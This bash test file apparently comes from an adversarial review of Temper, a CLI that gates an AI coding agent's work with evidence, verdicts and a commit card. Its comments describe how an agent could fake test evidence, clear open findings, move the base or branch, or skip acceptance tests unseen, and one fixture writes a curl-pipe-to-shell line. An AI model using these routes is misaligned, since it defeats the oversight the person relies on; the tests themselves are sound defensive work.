# Case file 89: round 2 of the adversarial review of 9.8.5, the fixes of round 1 read again by two reviewers.
# Reviewer 2 (rules 5 to 10) first, then reviewer 1 (rules 1, 2, 3, 4 and 11 and the upgrade). Sourced by
# test-temper.sh; its helpers (setup, fresh, gpass, _base_known) are used here. Each check stands on its own (its own
# setup) and was the reproduction of one finding of the round. A call that may fail stays inside $( ... ) or ends in
# || true, so the file always runs to its end.


# --- the helpers of this file ---
_r2r2_log() { # _r2r2_log <ERE>: how many entries of the rule log (the record the commit card lists) match the ERE
  python3 - "$1" <<'PY'
import json, re, sys
try:
    e = json.load(open(".temper/rule-log.json"))
except (OSError, ValueError):
    e = []
print(sum(1 for x in e if isinstance(x, dict) and re.search(sys.argv[1], "%s %s" % (x.get("kind"), x.get("what")))))
PY
}
_r2r2_next() { # action, then the calls of temper next, each after the word temper
  "$TEMPER" next --json 2>/dev/null | python3 -c "
import json, sys
d = json.load(sys.stdin)
print(d.get('action'), '|'.join(c.split('temper ', 1)[-1] for c in d.get('calls') or []))" 2>/dev/null
}

_r2r2_repo() { # a fresh git repository under the run: one source file, every file but the run's own in one commit
  rm -rf .git src; git init -q . 2>/dev/null; git checkout -q -B master 2>/dev/null
  git config user.email t@example.com; git config user.name T
  mkdir -p src; echo 'echo demo' > src/demo.sh; git add -A -- . ':(exclude).temper' ':(exclude).claude'; git commit -q -m base
}
_r2r2_g() { # _r2r2_g <python over g, the Check verdict of gates.json, that sets r>: prints r
  python3 - "$1" <<'PY'
import json, sys
try:
    g = json.load(open('.temper/gates.json')).get('check') or {}
except (OSError, ValueError):
    g = {}
row = lambda n: next((x for x in g.get('requirements') or [] if str(x.get('name', '')).startswith(n)), {})
r = None
exec(sys.argv[1])
print(r)
PY
}
_r2r2_gv() { python3 -c "import json; print(((json.load(open('.temper/groups.json'))['groups']['G1'].get('gate') or {}).get('verdict')) or 'none')" 2>/dev/null; }
_r2r2_used() { python3 -c "
import json
try:
    u = json.load(open('.temper/budget.json')).get('used') or []
except (OSError, ValueError, AttributeError):
    u = []
print(sum(1 for x in u if isinstance(x, dict) and x.get('key') == 'group:G1'))" 2>/dev/null; }
_r2r2_brow() { # _r2r2_brow <name prefix>: pass of that row of the Build verdict
  python3 - "$1" <<'PY'
import json, sys
try:
    g = json.load(open('.temper/gates.json')).get('build') or {}
except (OSError, ValueError):
    g = {}
print(next((x.get('pass') for x in g.get('requirements') or [] if str(x.get('name', '')).startswith(sys.argv[1])), 'none'))
PY
}

# --- rule 10 (fix 4bd2953): the rule's run of a timed out group check, in a run that asks at every stage ---
# The first time out of a group's check is no question in any mode (flow_build.group_failed: the CLI runs it again with
# twice the limit before it looks at r.armed()). 4bd2953 writes its entry with _rule_log, which rule_log.py keeps only
# while the run goes on by itself, so after "Ask me at every stage" the rule's move is in no entry the commit card lists
# (d1afce1 fixed the same gap for a repair with by_rule, and missed this path).
fresh
printf '%s\n' '# Tasks: demo' '' '**Integration:** `true`' '' '## Group G1: Core' '**Depends:** none' '**Validate:** `true`' \
  '**Context:**' 'x' '' '### Task 1: first' '**File:** `src/p1.sh`' '**Depends:** none' '**Test:** `true`' '**Cases:**' '- p' \
  '- [x] done' > .temper/specs/demo/tasks.md
gpass intent plan; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1
"$TEMPER" state set run_mode interactive >/dev/null 2>&1; "$TEMPER" state advance plan_complete build >/dev/null 2>&1
python3 - <<'PY'
import json
g = {"version": 1, "slug": "demo", "groups": {"G1": {"status": "running", "worktree": "w1", "branch": "temper/demo/G1",
     "fails": 1, "gate": {"verdict": "FAIL", "reason": "group G1 Validate timed out after 600s: true", "ran": True,
                          "timeout_s": 600}}}, "tasks": {"1": {"status": "passed", "group": "G1"}}}
json.dump(g, open(".temper/groups.json", "w"))
PY
_r2r2_a_next="$(_r2r2_next)"
"$TEMPER" group gate G1 --timeout-s 1200 >/dev/null 2>&1 || true
assert_eq "round 2 reviewer 2: the rule's run of a timed out group check with twice the limit is in the rule log in a run that asks at every stage" \
  "mode=interactive|rule's move=auto group gate G1 --timeout-s 1200|logged=1" \
  "mode=$("$TEMPER" state get run_mode 2>/dev/null)|rule's move=$_r2r2_a_next|logged=$(_r2r2_log 'G1')"

# --- rule 5 (fix cd38d16): the suite's own text, run as words with no shell, is another command ---
# cd38d16 counts a run under the suite's claim only when its recorded cmd is the suite's text. `temper evidence run`
# records "$*" of the words it ran with "$@", no shell, so the words of the suite's own text run another command: with
# the suite `echo FAIL: test_a; exit 1` (the CLI's run fails, through the shell), an agent's
# `evidence run --claim tests -- echo FAIL: test_a\; exit 1` runs echo (exit 0), records the suite's text, and passes the
# row `tests pass` on the tree the verdict names.
fresh; _r2r2_repo; printf 'check:\n  commands:\n    test: "echo FAIL: test_a; exit 1"\n' >> .claude/temper.config
gpass intent plan build review; _at check
"$TEMPER" check run >/dev/null 2>&1; "$TEMPER" gate check >/dev/null 2>&1
_r2r2_c_before="$(_r2r2_g "r = '%s:%s' % (g.get('verdict'), row('tests pass').get('pass'))")"
"$TEMPER" evidence run --stage check --claim 'tests: the suite (run by the CLI)' -- echo FAIL: 'test_a;' exit 1 >/dev/null 2>&1
"$TEMPER" gate check >/dev/null 2>&1
assert_eq "round 2 reviewer 2: the words of the suite's text run with no shell are no run of the suite: tests pass stays failed" \
  "before=FAIL:False|after=False" \
  "before=$_r2r2_c_before|after=$(_r2r2_g "r = row('tests pass').get('pass')")"

# --- rule 5 (fix 2b8953d): a scenario's own Test: text, run as words with no shell, traces it ---
# The same gap in acceptance.scenario_runs: the scenario's Test: line is a shell command (`echo FAIL: first; false`, the
# CLI's run fails), and `evidence run --scenario first -- echo FAIL: 'first;' false` records that very text and exit 0.
fresh; _r2r2_repo; printf 'check:\n  commands:\n    test: "true"\n' >> .claude/temper.config
sed -i '0,/  Test: true/s//  Test: echo FAIL: first; false/' .temper/specs/demo/intent.md
gpass intent plan build review; _at check
"$TEMPER" check run >/dev/null 2>&1; "$TEMPER" gate check >/dev/null 2>&1
_r2r2_d_before="$(_r2r2_g "r = '%s:%s' % (row('scenarios traced').get('pass'), row('acceptance evidence').get('pass'))")"
"$TEMPER" evidence run --stage check --scenario first --claim 'scenario: first' -- echo FAIL: 'first;' false >/dev/null 2>&1
"$TEMPER" gate check >/dev/null 2>&1
assert_eq "round 2 reviewer 2: the words of a scenario's Test: text run with no shell do not trace the scenario whose Test failed" \
  "before=False:False|after=False:False" \
  "before=$_r2r2_d_before|after=$(_r2r2_g "r = '%s:%s' % (row('scenarios traced').get('pass'), row('acceptance evidence').get('pass'))")"

# --- rule 9 (fix b238221): a failed group check checked again after a change no fix request paid for ---
# b238221 refuses `group fix G --commit` with no request open, so a fix commit always spends group:G. The check again
# itself spends nothing (`group gate G` with no flag), and the gate refuses only an uncommitted change to a tracked file
# (status --untracked-files=no): a file the agent adds in the group's worktree, uncommitted, makes Validate pass on the
# next `group gate G`, with no request, no commit and no repeat spent.
f9_tasks | m_setup
python3 - <<'PY'
import json
d = json.load(open(".temper/groups.json"))
for n in ("1", "2"):
    d.setdefault("tasks", {})[n] = {"status": "passed", "group": "G1"}
json.dump(d, open(".temper/groups.json", "w"))
p = ".temper/specs/demo/tasks.md"
text = open(p).read().replace("**Validate:** `true`", "**Validate:** `test -f src/fixed`")
open(p, "w").write(text)
for f in (".temper/groups.json", ".temper/build-state.json"):
    x = json.load(open(f)); x.pop("plan_hash", None); json.dump(x, open(f, "w"))
PY
"$TEMPER" group gate G1 >/dev/null 2>&1
_r2r2_e_first="$(_r2r2_gv)"
_r2r2_e_wt="$(python3 -c "import json; print(json.load(open('.temper/groups.json'))['groups']['G1']['worktree'])" 2>/dev/null)"
mkdir -p "$_r2r2_e_wt/src"; : > "$_r2r2_e_wt/src/fixed"
"$TEMPER" group gate G1 >/dev/null 2>&1
_r2r2_e_again="$(_r2r2_gv)"
assert_eq "round 2 reviewer 2: a failed group check passed again after a change no fix request paid for spends a repeat or is refused" \
  "first=FAIL|again=refused or paid" \
  "first=$_r2r2_e_first|again=$([[ "$_r2r2_e_again" == PASS && "$(_r2r2_used)" == 0 ]] && echo "passed with no repeat paid for" || echo "refused or paid")"

# --- rule 5 (fix cd38d16): the view's tests marker still reads the run the gate no longer counts ---
# cd38d16 makes the row `tests pass` read only runs of the suite's own command. The view the mod draws
# (flow_view.check_markers) still takes the latest row of any claim that names tests, so after the CLI's run of the
# configured suite failed, an agent's `evidence run --claim tests -- true` draws the Check's tests as passed while the
# gate fails them (a8daac8 made the coverage marker read the CLI's measure only, and left this one).
fresh; _r2r2_repo; printf 'check:\n  commands:\n    test: "echo FAIL: test_a; exit 1"\n' >> .claude/temper.config
gpass intent plan build review; _at check
"$TEMPER" check run >/dev/null 2>&1; "$TEMPER" gate check >/dev/null 2>&1
"$TEMPER" evidence run --stage check --claim 'tests: the suite (run by the CLI)' -- true >/dev/null 2>&1
"$TEMPER" gate check >/dev/null 2>&1; "$TEMPER" next --json >/dev/null 2>&1
assert_eq "round 2 reviewer 2: the view draws the Check's tests as the gate judged them, not from a run the gate does not count" \
  "gate=False|view=fail" \
  "gate=$(_r2r2_g "r = row('tests pass').get('pass')")|view=$(vw "next((x.get('state') for x in d.get('check_markers') or [] if x.get('name') == 'tests'), None)")"

# --- rules 6 and 10 (fix 9f36cf5): the acceptance tests a rule skipped after the approval are on no record the commit card lists ---
# 9f36cf5 shows a skipped acceptance row as skipped in the Check verdict. In a run that asks at every stage, after the
# approval, two launches of the writer with no lock are no question: the flow's own `work` runs `acceptance skip` by rule
# (flow_work.acceptance_work). acc_skip writes no entry of the rule log and no override, and the commit card has no
# acceptance section, so the commit question names neither the skip nor the rule that made it.
m_setup < <(f9_tasks); rm -f .temper/groups.json; f9_intent true true
"$TEMPER" acceptance start >/dev/null 2>&1; "$TEMPER" acceptance start >/dev/null 2>&1
_r2r2_f_next="$(nx "'%s:%s' % (d['action'], ' '.join(d['calls'][0].split('temper ', 1)[1].split()[:2]))")"
bash -c "$(nx "d['calls'][0]")" >/dev/null 2>&1
_r2r2_f_listed="$(python3 - <<'PY'
import json, re
def load(p):
    try:
        x = json.load(open(p))
        return x if isinstance(x, list) else []
    except (OSError, ValueError):
        return []
hit = [x for x in load(".temper/rule-log.json") + load(".temper/overrides.json")
       if isinstance(x, dict) and re.search("acceptance", json.dumps(x), re.I)]
print("yes" if hit else "no")
PY
)"
assert_eq "round 2 reviewer 2: the acceptance tests a rule skipped after the approval are on the record the commit question lists" \
  "mode=interactive|rule's move=work:acceptance skip|skipped=yes|listed=yes" \
  "mode=$("$TEMPER" state get run_mode 2>/dev/null)|rule's move=$_r2r2_f_next|skipped=$(python3 -c 'import json; print("yes" if json.load(open(".temper/evidence/acceptance-lock.json")).get("skipped") else "no")' 2>/dev/null)|listed=$_r2r2_f_listed"

# --- rule 5 (fix 2b8953d): the Build gate's criteria row still takes a run of another command under a scenario's name ---
# 2b8953d made Check (acceptance.scenario_runs) take, for a scenario with a Test: line, only runs of that command. The Build
# gate's row `criteria validated` (acceptance.build_report) still takes the latest row the CLI ran under the scenario's
# name: after the CLI's run of scenario first's own Test: (`false`) failed, `evidence run --stage build --scenario first
# -- true` passes the row.
fresh; _r2r2_repo; sed -i '0,/  Test: true/s//  Test: false/' .temper/specs/demo/intent.md
gpass intent plan; _at build
"$TEMPER" evidence run --stage build --scenario first --claim 'scenario: first' -- false >/dev/null 2>&1
"$TEMPER" evidence run --stage build --scenario second --claim 'scenario: second' -- true >/dev/null 2>&1
"$TEMPER" gate build >/dev/null 2>&1
_r2r2_g_before="$(_r2r2_brow 'criteria validated')"
"$TEMPER" evidence run --stage build --scenario first --claim 'scenario: first' -- true >/dev/null 2>&1
"$TEMPER" gate build >/dev/null 2>&1
assert_eq "round 2 reviewer 2: the Build gate's criteria row is not passed by a run of another command under the name of a scenario whose Test failed" \
  "before=False|after=False" \
  "before=$_r2r2_g_before|after=$(_r2r2_brow 'criteria validated')"

# ===== round 2, reviewer 1 =====

# --- the helpers of this file ---
_repo89() { # a git repository under the run, on master: one source file, every file but the run's own in one commit
  rm -rf .git src; git init -q . 2>/dev/null; git checkout -q -B master 2>/dev/null
  git config user.email t@example.com; git config user.name T
  mkdir -p src; echo 'echo demo' > src/demo.sh; git add -A -- . ':(exclude).temper' ':(exclude).claude'; git commit -q -m base
}
_fixrun89() { # a fix run past its approval (rca_complete), on its branch fix/bug
  setup; rm -f .temper/groups.json .temper/view.json .temper/build-state.json; _repo89
  "$TEMPER" state init bug --command fix --feature "the totals drop a cent" >/dev/null 2>&1; _base_known
  mkdir -p .temper/specs/bug; printf '# RCA\n\n## Root cause\n\nThe rounding.\n' > .temper/specs/bug/rca.md
  git checkout -q -B fix/bug 2>/dev/null; "$TEMPER" state set branch fix/bug >/dev/null 2>&1
  gpass rca; "$TEMPER" state advance rca_complete fix >/dev/null 2>&1
}
_row89() { # _row89 <stage> <row name>: the pass of that row of the stage's verdict in gates.json, or none
  python3 -I - "$1" "$2" <<'PY'
import json, sys
try:
    g = json.load(open(".temper/gates.json")).get(sys.argv[1]) or {}
except (OSError, ValueError):
    g = {}
print(next((str(r.get("pass")) for r in g.get("requirements") or [] if r.get("name") == sys.argv[2]), "none"))
PY
}
_older89() { # the run state as an older Temper saved it: no digest of the approved file, no saved_by stamp
  python3 -I - <<'PY'
import json
p = ".temper/build-state.json"
d = json.load(open(p))
for k in ("intent_hash", "saved_by"):
    d.pop(k, None)
json.dump(d, open(p, "w"), indent=2)
PY
}

# --- round 2 reviewer 1: rule 8, a ledger with an open finding is never cleared, whatever the words of the call ---
# person_call.py reads the stage of `evidence clear` from the FIRST --stage of the call; cmd_evidence_clear clears the
# stage of the LAST one. `temper evidence clear --stage plan --stage review` passes the check (the plan ledger holds no
# open finding) and empties the review ledger with its open high finding.
fresh
"$TEMPER" evidence add --stage review --claim 'src/demo.sh:1 the demo prints nothing on error' --severity high --label PROVEN >/dev/null 2>&1
"$TEMPER" evidence clear --stage review >/dev/null 2>&1; _c89a=$?
"$TEMPER" evidence clear --stage plan --stage review >/dev/null 2>&1; _c89b=$?
_n89="$(python3 -c 'import json; print(len(json.load(open(".temper/evidence/review.json"))))' 2>/dev/null || echo none)"
assert_eq "round 2 reviewer 1: rule 8 a clear of a ledger with an open finding is refused, also when the call names --stage twice" \
  "plain=refused|twice=refused|rows=1" \
  "plain=$([[ $_c89a -ne 0 ]] && echo refused || echo taken)|twice=$([[ $_c89b -ne 0 ]] && echo refused || echo taken)|rows=$_n89"

# --- round 2 reviewer 1: rule 11, base_sha is a full commit id with the mod off, also when typed as a path below it ---
# person_call.py checks `state set base_sha V` (the third word exactly base_sha); cmd_state_set takes a dotted path and
# refuses a second base_sha only when $1 is exactly base_sha. `temper state set base_sha.x HEAD` at Intent writes base_sha
# as the object {"x": "HEAD"}, plan_complete keeps it (it is not empty), and every diff from the base is read against a
# name git does not know: a file committed mid Build drops out of Review's file list, as the check of case 86 shows for
# `state set base_sha HEAD`.
fresh; _repo89
"$TEMPER" state set base_sha.x HEAD >/dev/null 2>&1; _b89=$?
gpass intent plan
"$TEMPER" state advance intent_complete plan >/dev/null 2>&1; "$TEMPER" state advance plan_complete build >/dev/null 2>&1
git checkout -q -B feature/demo 2>/dev/null
echo 'echo outside' > src/outside.sh; git add src/outside.sh
git -c core.hooksPath=/dev/null commit -q -m 'a checkpoint mid Build' >/dev/null 2>&1
_rv89="$("$TEMPER" review files 2>/dev/null | paste -sd, -)"
assert_eq "round 2 reviewer 1: rule 11 base_sha typed as a path below it (base_sha.x) is refused, and a file committed mid Build stays a changed file" \
  "set=refused|review=src/outside.sh" \
  "set=$([[ $_b89 -ne 0 ]] && echo refused || echo "taken:$("$TEMPER" state get base_sha 2>/dev/null)")|review=$_rv89"

# --- round 2 reviewer 1: rule 11, after the approval the run's branch stays the branch checked out, in a fix run too ---
# person_call.py takes "after the approval" from plan_hash, which only a feature run's plan_complete records. A fix run's
# approval (rca_complete) records intent_hash, the digest of rca.md, and no plan_hash: `temper state set branch X` passes
# after it, and the commit hook then gates X, so a commit on the branch the run stands on passes with one line.
_fixrun89
_fb89="$("$TEMPER" state get next_stage 2>/dev/null)|hash=$([[ -n "$("$TEMPER" state get intent_hash 2>/dev/null)" ]] && echo bound || echo none)"
"$TEMPER" state set branch elsewhere >/dev/null 2>&1; _fb89+="|set=$([[ $? -ne 0 ]] && echo refused || echo taken)"
assert_eq "round 2 reviewer 1: rule 11 after a fix run's approval the run's branch is not moved off the branch checked out" \
  "fix|hash=bound|set=refused|branch=fix/bug" "$_fb89|branch=$("$TEMPER" state get branch 2>/dev/null)"

# --- round 2 reviewer 1: rule 2, a fix run saved by an older Temper binds its root cause as found, as a feature run does ---
# approval.py saved (commit 1809748) binds intent.md as found for a saved /temper:temper run past its approval, so a
# change after the upgrade fails the row "intent unchanged since the approval". A saved /temper:fix run past its root
# cause question is left out (command == temper): 9.8.4 and the base recorded no digest of rca.md and no plan_hash, so
# binding_row passes it with "no digest was recorded" whatever rca.md says after the upgrade.
_l89=""
_fixrun89   # this version's run: the control
printf '\nThe rounding, and a second cause found later.\n' >> .temper/specs/bug/rca.md
"$TEMPER" gate commit >/dev/null 2>&1 || true
_l89+="this=$(_row89 commit "intent unchanged since the approval")"
_fixrun89; _older89
"$TEMPER" next --json >/dev/null 2>&1 || true   # taken up by this version (migrate_legacy stamps it)
"$TEMPER" gate commit >/dev/null 2>&1 || true
_l89+="|older=$(_row89 commit "intent unchanged since the approval")"
printf '\nThe rounding, and a second cause found later.\n' >> .temper/specs/bug/rca.md
"$TEMPER" gate commit >/dev/null 2>&1 || true
_l89+=",$(_row89 commit "intent unchanged since the approval")"
assert_eq "round 2 reviewer 1: rule 2 a fix run saved by an older Temper goes on as saved, and a root cause changed after the upgrade fails the row" \
  "this=False|older=True,False" "$_l89"

# --- round 2 reviewer 1: rule 4 and 5, the person's patch of the Integration command is the command Check runs ---
# Commit 0443f0e made tasks_md.parse the one reader of the Integration line: the LAST line is the plan's, and Check, the
# card, the baseline and the digest run or show it. plan_patch.py, which writes the person's answer to the Integration
# command question, still replaces the FIRST such line: with two lines the patch says "Integration is now X" while every
# reader goes on with the other line.
fresh
printf '\n**Integration:** `echo second`\n' >> .temper/specs/demo/tasks.md
gpass intent; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1
"$TEMPER" plan patch integration --cmd 'echo patched' >/dev/null 2>&1; _p89=$?
assert_eq "round 2 reviewer 1: rule 4 a plan patch of the Integration command changes the line every reader runs" \
  "patch=0|runs=echo patched" \
  "patch=$_p89|runs=$(python3 -c "import sys; sys.path.insert(0, sys.argv[1]); import check_run; print(check_run.plan_line('.temper/specs/demo'))" "$REPO_ROOT/scripts" 2>/dev/null)"

# --- round 2 reviewer 1: rules 3 and 4, a skip of the acceptance tests typed in a run that goes on by itself ---
# Commit f180c06 made the flow stop where the acceptance writer locked nothing, with the skip as the person's option at
# that stop; cmd_acceptance ends the unattended run after a skip only when the run is parked. With the mod off the
# session types `temper acceptance skip --reason R` with no stop open: the CLI records the skip and the run still goes
# on by itself, so a check is skipped by the run (rule 4) and the skip does not end it (rule 3).
_unattended build
printf '{"spec": ".temper/specs/demo", "launches": 2}\n' > .temper/evidence/acceptance-lock.json
"$TEMPER" acceptance skip --reason 'the session says so' >/dev/null 2>&1; _s89=$?
assert_eq "round 2 reviewer 1: rule 4 in a run that goes on by itself with no stop open a typed acceptance skip is refused, or it ends the run" \
  "refused-or-ended" \
  "$(_sk="$(python3 -c 'import json; print("skipped" if json.load(open(".temper/evidence/acceptance-lock.json")).get("skipped") else "not skipped")' 2>/dev/null)"
     _md="$("$TEMPER" state get run_mode 2>/dev/null)"
     if [[ $_s89 -ne 0 && $_sk == "not skipped" ]] || [[ $_md == interactive ]]; then echo refused-or-ended; else echo "rc=$_s89|$_sk|$_md"; fi)"

# --- round 2 reviewer 1: rule 2 and 4, a file the card did not show is no file of the plan for any reader ---
# Commit 8e08197 records approved_files from the File lines of tasks.md alone (the card's set), but every other reader
# still takes flow_base.plan_files with the file tables of plan.md (tables=True): `temper drift ask` refuses a file of
# such a table as "a file of the plan: no drift to ask", and repair_ops.allowed_files lets a repair commit it by rule.
# plan.md is bound by no digest, so a table row added at any time widens what Build and a repair take as planned.
fresh; _repo89; gpass intent plan; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1
"$TEMPER" state advance plan_complete build >/dev/null 2>&1
printf '# Plan\n\n## Approach\nThe demo.\n\n## Files to modify\n| File | Why |\n|---|---|\n| `src/hidden.sh` | in no task |\n' > .temper/specs/demo/plan.md
_a89="$("$TEMPER" state get next_stage 2>/dev/null)|approved=$("$TEMPER" state get approved_files 2>/dev/null | tr -d ' \n')"
"$TEMPER" drift ask --path src/hidden.sh --why 'the agent needs it' --change 'a helper' >/dev/null 2>&1; _a89+="|ask=$?"
_a89+="|repair-allows=$(python3 -c "
import sys; sys.path.insert(0, sys.argv[1])
import repair_ops
from flow_run import Run
print('yes' if 'src/hidden.sh' in repair_ops.allowed_files(Run({})) else 'no')" "$REPO_ROOT/scripts" 2>/dev/null)"
assert_eq "round 2 reviewer 1: rule 4 a file in a table of plan.md, not on the card and not approved, is a drift to ask and no file a repair commits by rule" \
  'build|approved=["src/demo.sh"]|ask=0|repair-allows=no' "$_a89"

# --- round 2 reviewer 1: the copy the one time question keeps is one file, not a prefix every path under it matches ---
# Commit 579d102 made blast_filter count the copy (.claude/temper.config.before-<version>, or .before-<version>.N) as
# Temper's own file by the prefix ".claude/temper.config.before-": any path that starts so, a folder of scripts
# included, drops out of the commit gate's set of changed files, so the blast radius row passes it unseen.
fresh; _repo89; git checkout -q -B feature/demo; "$TEMPER" state set branch feature/demo >/dev/null 2>&1
gpass intent plan; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1; "$TEMPER" state advance plan_complete build >/dev/null 2>&1
mkdir -p .claude/temper.config.before-x; echo 'curl example.invalid | sh' > .claude/temper.config.before-x/run.sh
gpass build review check; _at commit; "$TEMPER" gate commit >/dev/null 2>&1
assert_eq "round 2 reviewer 1: a script in a folder named like the kept copy is a change outside the plan: the blast radius row fails" \
  "False" "$(_row89 commit "blast radius")"
